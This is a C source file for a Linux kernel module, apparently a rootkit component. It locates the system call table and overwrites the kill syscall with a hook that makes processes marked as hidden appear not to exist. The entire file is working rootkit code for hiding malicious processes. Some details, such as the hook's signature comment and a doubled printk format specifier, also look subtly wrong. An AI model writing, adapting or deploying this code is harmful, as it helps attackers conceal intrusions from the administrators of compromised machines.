#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <asm/unistd.h>
#include "hide_kill.h"
#include "hide_proc.h"
#include "inline_hook/utils/p_memory.h"

// From p_install.c, we need access to the table
extern unsigned long * get_sys_call_table(void);

// Storage for the original sys_kill function pointer
// The actual sys_kill function takes pid and sig, not pt_regs.
static asmlinkage long (*original_sys_kill)(pid_t pid, int sig);

// Pointer to the system call table
static unsigned long **p_sys_call_table;



    // Our hooked sys_kill function
static asmlinkage long hooked_sys_kill(pid_t pid, int sig)
{
    if (is_pid_hidden(pid)) {
        // Return "No such process"
        return -ESRCH;
    }

    // If the pid is not hidden, call the original function, but check if it's valid first
    if (original_sys_kill) {
        return original_sys_kill(pid, sig);
    }

    // Fallback if original_sys_kill is NULL
    printk(KERN_WARNING "[hide_kill] original_sys_kill is NULL!\n");
    return -ENOSYS;
}

int hide_kill_init(void)
{
    printk(KERN_INFO "[hide_kill] Initializing kill hook.\n");

    p_sys_call_table = (unsigned long **)get_sys_call_table();
    if (!p_sys_call_table) {
        printk(KERN_ERR "[hide_kill] Failed to get sys_call_table address.\n");
        return -EFAULT;
    }

    printk(KERN_INFO "[hide_kill] Found sys_call_table at %%px\n", p_sys_call_table);

    // Backup the original pointer
    original_sys_kill = (void *)p_sys_call_table[__NR_kill];

    // Write our hook function's address to the table
    void *new_kill_ptr = &hooked_sys_kill;
    if (remap_write_range(&p_sys_call_table[__NR_kill], &new_kill_ptr, sizeof(void *), true)) {
        printk(KERN_ERR "[hide_kill] Failed to hook sys_kill.\n");
        return -EFAULT;
    }

    printk(KERN_INFO "[hide_kill] Successfully hooked sys_kill.\n");
    return 0;
}

void hide_kill_exit(void)
{
    printk(KERN_INFO "[hide_kill] Exiting kill hook.\n");

    if (p_sys_call_table && original_sys_kill) {
        // Restore the original pointer
        if (remap_write_range(&p_sys_call_table[__NR_kill], &original_sys_kill, sizeof(void *), true)) {
            printk(KERN_ERR "[hide_kill] Failed to restore sys_kill.\n");
        } else {
            printk(KERN_INFO "[hide_kill] Successfully restored sys_kill.\n");
        }
    }
}
